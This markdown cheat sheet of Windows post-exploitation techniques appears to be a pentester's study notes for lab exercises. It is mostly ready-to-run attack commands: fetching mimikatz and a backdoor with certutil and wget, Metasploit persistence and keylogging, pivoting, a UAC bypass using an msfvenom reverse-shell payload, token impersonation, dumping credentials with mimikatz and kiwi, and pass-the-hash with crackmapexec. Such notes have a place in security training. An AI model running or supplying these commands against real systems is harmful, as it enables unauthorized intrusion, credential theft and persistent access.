# General

<details>
<summary>Transfer files</summary>

- Windows
  - `certutil -urlcache -f http://<host>/mimikatz.exe mimikatz.exe`
- Linux
  - `wget http://<host>/backdoor.php`
- Netcat
  - `nc -nvlp 1234 > test.txt (recepient)`
  - `nc -nv ip port < test.txt (sender)`
    
</details>

# Windows

<details>
<summary>Enumeration</summary>

- System info
  - `systeminfo`
  - `whoami` : get current user
  - `whoami /priv` : get current user privileges
  - `wmic qfe get Caption,HotFixID,InstalledOn,Description` : get installed updates
  - `net localgroup <user>` : get group membership of user
  - `net user <user>` : get user info
- Network Info
  - `ipconfig /all`
  - `netstat -ano` : lists info on tcp/udp ports	
  - `netsh advfirewall show allprofiles` : shows f/w status
  - `arp -a` : display arp table
  - `route print` : print route table
- Processes & Services 
  - `net start` : lists services running
  - `wmic service list brief` : same as above with extra details like pid  
  - `net stop <servicename>` : stop a service
  - `tasklist /svc` : list process with respecive services
  - `schtasks /query /fo list /v` : list scheduled tasks
- Automation -> JAWS - https://github.com/411Hall/JAWS
  - `powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt`     

</details>

<details>
<summary>Persistence</summary>
 
- Metasploit
  - search persistence module
  - Ex: exploit/windows/local/persistence_service
    - It will generate and upload an executable to a remote host, next will make it a persistent service. It will create a new service which will start the payload whenever the service is running. Admin or system privilege is required.
- Enable RDP
  - with metasploit -> search enable_rdp (and set session)
    - Connect to victim from attacker
      - Note: you need username and password, if you don't have the password -> change it `net user <username> <new_pass>` (suspicious in a real environment) or crack NTLM...
      - Note 2: you can create a new account and add it to administrator group...
        
</details>

<details>
<summary>Keylogger</summary>
 
- Metasploit
  - `keyscan_start` : start keylogger
  - `keyscan_dump` : print captured strokes
        
</details>

<details>
<summary>Pivoting</summary>
 
- Metasploit
  - `ipconfig` -> find subnet (the host may be 
  - `run autoroute -s <subnet>` -> adds routes
  - `run autoroute -p` -> displays active routing table
  - auxiliary/scanner/portscan/tcp -> discover other systems
  - `portfwd add -l 1234 -p 80 -r <target_sys_2_ip>` -> forward remote port to local port
  - `portfwd list`
  - `nmap -sV -sS -p 1234 localhost`
  - since target_sys_2 does not have a route back to attacker_sys, use bind_shell payload -> windows/meterpreter/bind_tcp
  
</details>

<details>
<summary>Privilege Escalation</summary>

<br>

<details>
<summary>UAC Bypass</summary>
 
- User Account Control (UAC) is a feature that enables a consent prompt for elevated activities.
- Prerequisites:
  1.  User must be a member of the Administrators group.
     - `net localgroup administrators`
  2. Full interactive shell with the victim (a common nc.exe shell is not enough).
     - You can use meterpreter
- Metasploit
  - search module bypassuac ...
- UACME
  1. If architecture is x64 it's better to use meterpreter x64 or migrate to process x64 with sessions=1
     - `ps` to show process 
     - (ex. `migrate <PID explorer.exe>`)
  3. Upload Akagi (Akagi64.exe if x64)
  3. Create payload with msfvenom
     - `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o backdoor.exe`
  5. Use exploit/multi/handler to start a listener
  6. Akagi64.exe 23 <payload_full_path>
     - **NOTE FULL PATH**
  7. Once run, we will get meterpreter session - getprivs/getsystem to get elevated privs
      
</details>

<details>
<summary>Impersonate Tokens</summary>
  
- With msfconsole: `load incognito`
- `list_tokens -u`
- `impersonate_token <token_name>`
- You may need to migrate process to a <user> process
  - Ex. `getpid` -> 2628, `ps` ->
    |PID  | PPID | Name | Arch | Session | User | Path|
    | ---  | --- | --- | ---  | --- | --- | --- |
    |2628 | 4780 | WHAYQtsbkO.exe |  | 1 | | |
    |... | ... | ... | ... | ... | ... | ... |
    |2948 | 2036 | explorer.exe | X64 | 1 | ATTACKDEFENSE\Administrator | C:\Windows\explorer.exe |
- `getpid 2948`
- Of course you can repeat the process to become NT AUTHORITY\SYSTEM

</details>

<details>
<summary>Password in configuration file (Unattend.xml)</summary>

- An answer file is an XML-based file that contains setting definitions and values to use during Windows Setup. Answer files (or Unattend files) are used by Administrators when they are setting up fresh images as it allows for an automated setup for Windows systems.
- ```
  C:\unattend.xml
  C:\Windows\Panther\Unattend.xml
  C:\Windows\Panther\Unattend\Unattend.xml
  C:\Windows\system32\sysprep.xml
  C:\Windows\system32\sysprep\sysprep.xml
  ```
- Extract password and decode it (from base64)
      
</details>

<details>
<summary>Credential Dumping (Mimikatz - Kiwi - Hashdump)</summary>
    
- Prerequisites: User must be a member a local Administrators.
1) Method (Metasploit - Meterpreter)
   - You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process (ex. `migrate <PID explorer.exe>`)
   - `hashdump`
2) Kiwi (Metasploit - Meterpreter)
   - You may need to migrate meterpreter to NT AUTHORITY\SYSTEM process (ex. `migrate <PID explorer.exe>`)
   - `load kiwi`
   - `creds_all` Retrieve all credentials (parsed)
   - `lsa_dump_sam` Here you can see that NTLM hashes for all of the user accounts on the system.
   - To find the clear text passwords -> `lsa_dump_secrets`
     - However, from the Windows version 8.0+, windows donâ€™t store any plain text password. So, it can be helpful for the older version of the Windows.
3) Mimikatz
   - upload mimikatz.exe
   - `\mimkatz.exe`
   - `privilege::debug` - should return Privilege '20' OK - This should be a standard for running mimikatz as it needs local administrator access
   - `lsadump::sam` -> NTLM hashes for all of the user accounts on the system 
   - `sekurlsa::logonpasswords` -> To find the clear text passwords, but it's not always possible

</details>

<details>
<summary>Pass the Hash</summary>

Useful for persinstence...
1) `crackmapexec smb <ip> -u <administrator> -H <NTLM hash> -x "ipconfig"`
2) Metasploit -> windows/smb/psexec and set SMBPass with `<LM hash>:<NTLM hash>`
   - empty LM hash -> `AAD3B435B51404EEAAD3B435B51404EE` (means its non-use).
     - `AAD3B435B51404EEAAD3B435B51404EE:<NTLM>`
   - With `hashdump` you have the right format
  
</details>

<details>
<summary>Other</summary>

- Powershell History
- Saved Windows Credentials
  - cmdkey /list
  - runas /savecred /user:admin cmd.exe
- Scheduled Tasks
- Insecure Permissions on Service Executable
- Unquoted Service Paths
- Insecure Service Permissions
- Windows Privileges
- Unpatched Software
  
</details>


</details>
